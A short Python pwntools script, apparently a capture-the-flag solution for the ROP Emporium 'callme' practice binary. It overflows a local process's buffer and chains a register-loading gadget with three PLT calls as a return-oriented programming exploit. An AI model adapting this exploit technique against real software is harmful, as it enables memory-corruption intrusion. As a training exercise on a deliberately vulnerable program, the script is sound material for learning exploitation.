#!/usr/bin/env python
# Author : 0xsegf
# https://github.com/arjunshibu
# https://www.hackthebox.eu/home/users/profile/201892
from pwn import *

context.log_level = 'critical'

p = process('./callme')

rop = cyclic(40)
rop += p64(0x401ab0)        # pop rdi ; pop rsi ; pop rdx ; ret
rop += p64(0x1)
rop += p64(0x2)
rop += p64(0x3)
rop += p64(0x401850)        # callme_one@plt
rop += p64(0x401ab0)        # pop rdi ; pop rsi ; pop rdx ; ret
rop += p64(0x1)
rop += p64(0x2)
rop += p64(0x3)
rop += p64(0x401870)        # callme_two@plt
rop += p64(0x401ab0)        # pop rdi ; pop rsi ; pop rdx ; ret
rop += p64(0x1)
rop += p64(0x2)
rop += p64(0x3)
rop += p64(0x401810)        # callme_three@plt

print p.recvuntil('>')
p.sendline(rop)
p.recv()
p.interactive()
